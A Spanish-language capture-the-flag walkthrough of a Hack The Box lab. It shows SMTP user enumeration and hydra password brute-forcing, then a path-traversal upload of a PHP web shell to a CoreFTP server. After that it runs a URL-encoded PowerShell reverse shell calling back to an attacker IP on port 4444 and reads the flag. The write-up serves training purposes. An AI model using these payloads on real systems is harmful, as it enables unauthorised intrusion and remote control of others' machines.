# Attacking common Services - Easy

## Enunciado

We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:

- HTB{...}

Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

## Solución

- Encontramos los siguientes puertos abiertos:

	```plaintext
	21/tcp   open  ftp
	25/tcp   open  smtp
	80/tcp   open  http
	443/tcp  open  https
	587/tcp  open  submission
	3306/tcp open  mysql
	3389/tcp open  ms-wbt-server
	```

- Ponemos inlanefreight.htb en `hosts`

- Probamos a encontrar usuarios utilizando `smtp-user-enum`

	```bash
	smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t $target
	```

	Encontrando como usuario válido `fiona@inlanefreight.htb`

- A continuación hacemos fuerza bruta 

	```bash
	hydra -l 'fiona@inlanefreight.htb' -P /usr/share/wordlists/rockyou.txt smtp://$target	
	```

	Encontrando como password válida `987654321`

- Nos conectamos por ftp con las credenciales obtenidas

	```bash
	ftp fiona@$target
	#ls no funciona y pone que hay que pasar a binary mode para descargar archivos
	binary
	passive
	# Se queda colgado
	# Ctrl + C
	passive
	get docs.txt
	get WebServersInfo.txt
	```

- Encontramos la siguiente información 
	- `docs.txt`:

		```textplain
		I'm testing the FTP using HTTPS, everything looks good.   
		``` 

	- `WebServersInfo.txt`

		```textplain
		CoreFTP:
		Directory C:\CoreFTP
		Ports: 21 & 443
		Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

		Apache
		Directory "C:\xampp\htdocs\"
		Ports: 80 & 4443
		Test Command: curl http://localhost/test.php
		```

- Dado que es un coreFTP, podemos subir código de forma arbitraria, por lo que tratamos de subir código a `C:\xampp\htdocs\`

- Creamos un archivo php llamado `simplephp.php` con el siguiente contenido:

	```php
	<?php system($_GET['cmd']);?>
	```

	y lo subimos del siguiente modo

	```bash
	curl -k -X PUT -H "Host: $target" --basic -u fiona:987654321 --data-binary "@simplephp.php" --path-as-is "https://$target/../../../../../../xampp/htdocs/rev.php"
	```

	(en este caso particular funcionaría sin envíar la cabecera)

- Después de subir el archivo comprobamos que funciona escribiendo lo siguiente: 

	```bash
	curl http://$target/rev.php?cmd=whoami
	```

	Comprobando que somo `nt authority\system`

- Creamos un archivo `revshell` con el siguiente contenido (tomado de revshells):

	```textplain
	powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.14.135%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
	```

- Nos ponemos en escucha por el puerto 4444 y tras ejecutar el siguiente comando: 

	```bash
	curl http://$target/rev.php?cmd=$(cat revshell) 
	```

	comprobamos que tenemos conexión

- Con esto ya podemos leer el contenido de la flag:

	```powershell
	PS C:\Users\Administrator\Desktop> type flag.txt
	HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
	```


---

- Comprobamos que con estas credenciales podemos conectarnos tambíén a mysql

	```bash
	mysql -u fiona -p987654321 -h $target
	```






